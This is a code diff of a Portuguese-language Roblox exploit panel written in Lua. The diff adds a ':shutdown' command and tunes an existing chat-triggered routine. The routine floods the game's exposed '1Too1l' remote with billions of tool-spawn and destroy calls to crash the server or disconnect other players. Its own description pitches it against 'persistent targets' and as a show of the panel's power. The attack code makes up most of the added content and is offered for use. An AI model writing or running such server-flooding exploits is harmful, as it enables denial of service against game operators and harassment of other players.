@@ -143,6 +143,7 @@ MainTab:Button({
             {Comando = ":cmds", Desc = "Abre esta interface visual contendo a lista de comandos."},
             {Comando = ":bring [alvo]", Desc = "traz o jogador até você, depois limpa os Props."},
             {Comando = ":jump [alvo]", Desc = "pega os Props trampolim e teleporta na perna e limpa os itens."},
+            {Comando = ":shutdown", Desc = "Desliga o servidor ou Desconecta os jogadores com uma mensagem específica"},
         }
 
         -- Cria as linhas visuais dinamicamente na tela
@@ -929,6 +930,87 @@ MainTab:Button({
     end
 })
 
+MainTab:Button({
+   Title = ":shutdown",
+   Desc = "desliga o servidor ou desconecta os jogadores com a mensagem "Verifique sua conexão com a internet e tente denovo." e alguns vão relatar que o jogo esta travando, este comando é apenas quando necessário, quando aqueles alvos persistentes que ficam sentando, se a pessoa falar que o painel é fraco, pode usar esta função para mostrá-lo que este painel não é um Hub, Hubs são patéticos.",
+Callback = function()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function executarShutdownPorChat()
+    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+    if not rootpart then return end
+    local oldcf = rootpart.CFrame
+
+    local re = ReplicatedStorage:FindFirstChild("RE")
+    local toolRemote = re and re:FindFirstChild("1Too1l")
+    if not toolRemote then return end
+
+    -- Notificação visual na WindUI do LocalPlayer
+    pcall(function()
+        WindUI:Notify({ 
+            Title = "Shutdown", 
+            Content = "O servidor esta sendo desligado e desconecta do alguns Player, Não há como voltar atrás.", 
+            Duration = 5 
+        })
+    end)
+
+    task.spawn(function()
+        for m = 1, 9000000000 do
+            task.spawn(function()
+                if toolRemote:IsA("RemoteFunction") then
+                    toolRemote:InvokeServer("PickingTools", "FireHose")
+                else
+                    toolRemote:FireServer("PickingTools", "FireHose")
+                end
+            end)
+
+            local backpack = localPlayer:FindFirstChild("Backpack")
+            if backpack then
+                local fireHose = backpack:FindFirstChild("FireHose")
+                if fireHose and fireHose:FindFirstChild("ToolSound") then
+                    fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                end
+            end
+            if m % 15 == 0 then task.wait(0.3) end
+        end
+    end)
+
+    task.wait(0.3)
+    localPlayer.CharacterRemoving:Wait()
+    local newCharacter = localPlayer.CharacterAdded:Wait()
+    local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+    local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+    if newRootPart and humanoid then
+        task.wait(0.7)
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+        newRootPart.CFrame = oldcf
+        newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    end
+
+    task.wait(0.5)
+
+    local backpack = localPlayer:WaitForChild("Backpack", 10)
+    if backpack then
+        local items = backpack:GetChildren()
+        local equipCount = 0
+        for i = 1, #items do
+            local item = items[i]
+            if item:IsA("Tool") and item.Name == "FireHose" then
+                equipCount = equipCount + 1
+                task.defer(function() item.Parent = newCharacter end)
+                if equipCount % 8 == 0 then task.wait(0.02) end 
+            end
+        end
+    end
+    task.wait(0.5)
+end
+end
+})
+
 -- ====================================================================
 -- SISTEMA DE COMANDOS VIA CHAT PARA ;PUNISH (COLE NO FINAL DO ARQUIVO)
 -- ====================================================================
@@ -1222,13 +1304,13 @@ local function executarShutdownPorChat()
     pcall(function()
         WindUI:Notify({ 
             Title = "Shutdown", 
-            Content = "O servidor esta sendo desligado e desconectando Players", 
+            Content = "O servidor esta sendo desligado e desconecta do alguns Player, Não há como voltar atrás.", 
             Duration = 5 
         })
     end)
 
     task.spawn(function()
-        for m = 1, 50000 do
+        for m = 1, 9000000000 do
             task.spawn(function()
                 if toolRemote:IsA("RemoteFunction") then
                     toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -1244,7 +1326,7 @@ local function executarShutdownPorChat()
                     fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                 end
             end
-            if m % 15 == 0 then task.wait(0.4) end
+            if m % 15 == 0 then task.wait(0.3) end
         end
     end)
 
@@ -1282,7 +1364,7 @@ end
 -- Escuta as mensagens enviadas no chat do jogo
 local function aoFalarShutdown(message)
     -- Verifica se você digitou exatamente ";shutdown"
-    if string.lower(message) == ":shutdown277" then
+    if string.lower(message) == ":shutdown" then
         executarShutdownPorChat()
     end
 end
@@ -2329,7 +2411,7 @@ if AlvoPath then
 
     -- 3. Exibe o resumo total em um parágrafo informativo
     Security:Paragraph({
-        Title = "🔍 Relatório de Varredura (" .. tostring(totalContado) .. " encontrados)",
+        Title = "🔍 Relatório de Varredura para reportar remotos expostos para a voldex (" .. tostring(totalContado) .. " encontrados)",
         Desc = "Lista consolidada de todas as portas de comunicação abertas no diretório RE."
     })
 
